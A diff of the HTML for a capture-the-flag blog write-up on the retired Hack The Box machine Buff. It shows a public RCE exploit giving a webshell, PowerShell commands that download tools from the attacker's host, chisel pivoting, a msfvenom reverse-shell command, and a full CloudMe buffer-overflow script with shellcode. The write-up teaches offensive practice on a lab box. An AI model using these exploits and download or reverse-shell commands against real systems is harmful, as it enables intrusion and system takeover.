@@ -1,160 +1,116 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Buff published on July 18 2020 egotisticalSW This box is classified as an easy machine. The user part just require to exploit a CVE. The root part require first to pivot to access the box&#39;s internal services then exploit another CVE." />
-<meta name="keywords" content="security, boot2root, HTB, Windows, chisel, cloudme">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Buff"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Buff published on July 18 2020 egotisticalSW This box is classified as an easy machine. The user part just require to exploit a CVE. The root part require first to pivot to access the box&#39;s internal services then exploit another CVE."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2020/11/htb-buff.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2020-11-22 12:41:00+01:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="Windows"/>
-  <meta property="article:tag" content="chisel"/>
-  <meta property="article:tag" content="cloudme"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Buff</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Buff published on July 18 2020 egotisticalSW This box is classified as an easy machine. The user part just require to exploit a CVE. The root part require first to pivot to access the box's internal services then exploit another CVE." name="description"/>
+<meta content="security, boot2root, HTB, Windows, chisel, cloudme" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Buff" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Buff published on July 18 2020 egotisticalSW This box is classified as an easy machine. The user part just require to exploit a CVE. The root part require first to pivot to access the box's internal services then exploit another CVE." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2020/11/htb-buff.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-11-22 12:41:00+01:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="Windows" property="article:tag"/>
+<meta content="chisel" property="article:tag"/>
+<meta content="cloudme" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Buff</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-buff">HTB: Buff</h1>
-    <p>
+<header>
+<h1 id="htb-buff">HTB: Buff</h1>
+<p>
       Posted on 22 Nov 2020 in <a href="../../category/security.html">security</a>
 
-        &#8226; 4 min read
+        • 4 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2020.11/buff_card.png" alt="Buff card" width="262"></p>
+</header>
+<div>
+<p><img alt="Buff card" class="align-left" src="/media/2020.11/buff_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/263">Buff</a> published on
 July 18 2020
@@ -162,8 +118,6 @@ July 18 2020
 This box is classified as an easy machine.
 The user part just require to exploit a CVE. The root part require first to
 pivot to access the box's internal services then exploit another CVE.</p>
-
-
 <h1>User</h1>
 <h2>Recon</h2>
 <p>We start with an nmap scan. Despite being a Windows boxes, only a few services
@@ -177,10 +131,9 @@ PORT     STATE SERVICE    VERSION
 7680/tcp open  pando-pub?
 8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
 </code></pre></div>
-
 <h2>Web</h2>
 <p>The website is a promotional website for a Gym.</p>
-<p><img alt="Buff homepage" src="/media/2020.11/buff_01.png"></p>
+<p><img alt="Buff homepage" class="image-process-article-image" src="/media/2020.11/derivatives/article-image/buff_01.png"/></p>
 <p>We browse the site and found the <a href="http://10.10.10.198:8080/contact.php">contact page</a>.
 On it we can read that the site was "Made using Gym Management Software 1.0".</p>
 <p>Despite the site looking like a homemade site for the purpose of the box, this
@@ -192,12 +145,11 @@ Exploit Title                                  |  Path
 Gym Management System 1.0 - Unauthenticated RCE | php/webapps/48506.py
 ------------------------------------------------ ---------------------------------
 </code></pre></div>
-
 <p>We run the exploit, see who we are and get the user flag.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ python2 48506.py http://10.10.10.198:8080/
             /\
 /vvvvvvvvvvvv \--------------------------------------,
-`^^^^^^^^^^^^ /============BOKU=====================&quot;
+`^^^^^^^^^^^^ /============BOKU====================="
             \/
 
 [+] Successfully connected to webshell.
@@ -209,25 +161,23 @@ C:\xampp\htdocs\gym\upload&gt; whoami
 �
 buff\shaun
 
-C:\xampp\htdocs\gym\upload&gt; type &quot;C:\Users\shaun\Desktop\user.txt&quot;
+C:\xampp\htdocs\gym\upload&gt; type "C:\Users\shaun\Desktop\user.txt"
 �PNG
 �
 6c675c6c581ec9341b8ed8717c537e32
 </code></pre></div>
-
 <h1>root</h1>
 <p>We can use our limited shell to download exec from our kali box (running a
 simple python HTTP server) and execute them. For instance we can run
 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></p>
-<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; powershell -exec bypass -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.24:8080/winPEAS.exe&#39;, &#39;.\winPEAS.exe&#39;)
+<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24:8080/winPEAS.exe', '.\winPEAS.exe')
 C:\xampp\htdocs\gym\upload&gt; .\winPEAS.exe
 &lt;SNIP&gt;
 </code></pre></div>
-
 <h2>Cloudme</h2>
 <p>Still browsing our user's folders we found an specific binary in <code>Downloads</code>:
 <code>CloudMe_1112.exe</code>.</p>
-<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; dir &quot;C:\Users\Shaun\Downloads&quot;
+<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; dir "C:\Users\Shaun\Downloads"
 �PNG
 �
 Volume in drive C has no label.
@@ -241,7 +191,6 @@ Directory of C:\Users\Shaun\Downloads
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,639,174,144 bytes free
 </code></pre></div>
-
 <p>This also is a public software with some exploit available. For our specific
 version (1.11.2), only four exploits applies.</p>
 <div class="highlight"><pre><span></span><code>kali@kali:~$ searchsploit cloudme
@@ -260,7 +209,6 @@ CloudMe Sync &lt; 1.11.0 - Buffer Overflow       | windows/remote/44027.py
 CloudMe Sync &lt; 1.11.0 - Buffer Overflow (SEH) | windows_x86-64/remote/44784.py
 ---------------------------------------------- ---------------------------------
 </code></pre></div>
-
 <p>But as we saw earlier only the port 8080 is open on the box. The <code>CloudMe</code>
 software is only running locally on the box. We need to use some pivoting
 technique to access the internal box services in order to use the exploit
@@ -283,40 +231,40 @@ technique to access the internal box services in order to use the exploit
 <span class="c1">#Response Date: March 14, 2018</span>
 <span class="c1">#Bug Fixed: April 12, 2018</span>
 
-<span class="c1"># Run this file in victim&#39;s win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.</span>
+<span class="c1"># Run this file in victim's win 7 sp1 x86 system where CloudMe Sync 1.11.0 has been installed.</span>
 
 <span class="kn">import</span> <span class="nn">socket</span>
 
-<span class="n">target</span><span class="o">=</span><span class="s2">&quot;127.0.0.1&quot;</span>
+<span class="n">target</span><span class="o">=</span><span class="s2">"127.0.0.1"</span>
 
-<span class="n">junk</span><span class="o">=</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1052</span>
+<span class="n">junk</span><span class="o">=</span><span class="s2">"A"</span><span class="o">*</span><span class="mi">1052</span>
 
-<span class="n">eip</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\x7B\x8A\xA9\x68</span><span class="s2">&quot;</span>      <span class="c1">#68a98a7b : JMP ESP - Qt5Core.dll</span>
+<span class="n">eip</span><span class="o">=</span><span class="s2">"</span><span class="se">\x7B\x8A\xA9\x68</span><span class="s2">"</span>      <span class="c1">#68a98a7b : JMP ESP - Qt5Core.dll</span>
 
 <span class="c1">#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1 LPORT=4444 -f c</span>
 
-<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span> <span class="s2">&quot;</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x18\x68</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s2">&quot;</span>
-<span class="s2">&quot;</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span> <span class="s2">"</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\x18\x68</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s2">"</span>
+<span class="s2">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5</span><span class="s2">"</span><span class="p">)</span>
 
 <span class="n">payload</span><span class="o">=</span><span class="n">junk</span><span class="o">+</span><span class="n">eip</span><span class="o">+</span><span class="n">shellcode</span>
 
@@ -324,26 +272,22 @@ technique to access the internal box services in order to use the exploit
 <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
 <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </code></pre></div>
-
 <h2>chisel</h2>
 <p>We will use <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md#chisel">chisel</a>
 in order to access <code>CloudMe</code> service.</p>
 <p>On our kali we run <code>chisel</code> in server mode.</p>
 <div class="highlight"><pre><span></span><code>./chisel_1.6.0_linux_amd64 server -p 9001 -reverse
 </code></pre></div>
-
 <p>Using our limited shell we download our <code>chisel</code> binary on the box and run it as
 client on port <code>8888</code> (remember this strange open port on the nmap scan?) as
 CloudMe is also running on port 8888 (as stated on the exploit <code>44770.py</code>).</p>
-<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; powershell -exec bypass -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://10.10.14.24:8080/chisel.exe&#39;, &#39;.\chisel.exe&#39;)&quot;
+<div class="highlight"><pre><span></span><code>C:\xampp\htdocs\gym\upload&gt; powershell -exec bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.24:8080/chisel.exe', '.\chisel.exe')"
 C:\xampp\htdocs\gym\upload&gt; .\chisel.exe client 10.10.14.24:9001 R:8888:localhost:8888
 </code></pre></div>
-
 <p>The exploit <code>44770.py</code> also told us to generate a new shellcode using
 <code>msfvenom</code>.</p>
 <div class="highlight"><pre><span></span><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f c
 </code></pre></div>
-
 <p>We update the script with our shell code, configure the <code>metasploit</code> handler and
 run it as well as the exploit script (with <code>python 44470.py</code>) . We got a shell as <code>administrator</code> and can
 get the root flag.</p>
@@ -360,67 +304,45 @@ C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 4ea57b2b8df4db2ea72531bcc50c5a86
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was really quick as it only require to exploit two CVE. The pivoting
 technique was an interesting complication for an easy HTB machine.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/windows.html">Windows</a>
-      <a href="../../tag/chisel.html">chisel</a>
-      <a href="../../tag/cloudme.html">cloudme</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2020/11/htb-tabby.html" title="HTB: Tabby">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2020/12/htb-sneakymailer.html" title="HTB: Sneakymailer">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/windows.html">Windows</a>
+<a href="../../tag/chisel.html">chisel</a>
+<a href="../../tag/cloudme.html">cloudme</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2020/11/htb-tabby.html" title="HTB: Tabby">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2020/12/htb-sneakymailer.html" title="HTB: Sneakymailer">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -431,6 +353,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
